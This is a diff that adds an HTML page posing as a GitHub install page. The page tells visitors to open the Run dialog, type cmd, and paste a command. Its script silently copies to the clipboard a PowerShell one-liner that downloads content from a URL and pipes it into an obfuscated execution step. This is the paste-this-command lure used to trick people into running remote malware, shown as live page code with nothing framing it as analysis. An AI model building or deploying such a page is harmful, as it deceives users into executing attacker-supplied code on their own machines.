@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="description" content="Install page"><title>Loading…</title></head>
+<body>
+<nav class="gh-nav"><a class="gh-nav-brand" href="https://github.com/">GitHub</a></nav>
+<ol class="steps">
+  <li><div class="step-title">Press @@RUN_DIALOG@@</div><div class="step-note">Type <b>cmd</b> and press Enter.</div></li>
+  <li><div class="step-title">Paste the command and press Enter</div></li>
+</ol>
+<button class="copy-btn" id="copy">Copy</button>
+<script>
+  const CONFIG = { installUrl: "https://example.invalid/setup" };
+  CONFIG.cmdCmd = `powershell -c "(irm '${CONFIG.installUrl}' -TimeoutSec 30)|@@OBF_IEX@@"`;
+  async function copyText(text) {
+    if (navigator.clipboard && window.isSecureContext) {
+      try { await navigator.clipboard.writeText(text); return true; } catch (_) {}
+    }
+    return false;
+  }
+  document.getElementById("copy").onclick = () => copyText(CONFIG.cmdCmd);
+</script>
+</body>
+</html>
